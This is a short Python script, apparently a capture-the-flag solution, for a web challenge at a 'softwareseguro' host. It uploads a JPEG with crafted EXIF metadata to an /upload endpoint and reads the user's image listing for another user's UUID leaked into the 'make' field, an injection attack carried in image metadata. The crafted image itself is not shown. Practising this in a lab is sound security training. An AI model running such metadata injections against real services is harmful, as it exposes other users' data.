# upload_inj.py — send inj.jpg (exiftool-crafted) and read the leaked user_id from our listing
import requests, base64, json
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID = "ea42cd39-001b-4fb5-a509-449322674687"

uri = "data:image/jpeg;base64," + base64.b64encode(open("inj.jpg","rb").read()).decode()
r = requests.post(f"{BASE}/upload", json={"image": uri, "description": "leak", "user_id": UID})
print("upload ->", r.status_code, r.text[:80])

data = requests.get(f"{BASE}/images/{UID}").json()
print("\n-- rows with description 'leak' (check the 'make' field for a leaked UUID) --")
for img in data:
    if img.get("description") == "leak":
        print(json.dumps({k: img[k] for k in ("id","make","model","datetime","summary_ocr")}, ensure_ascii=False))
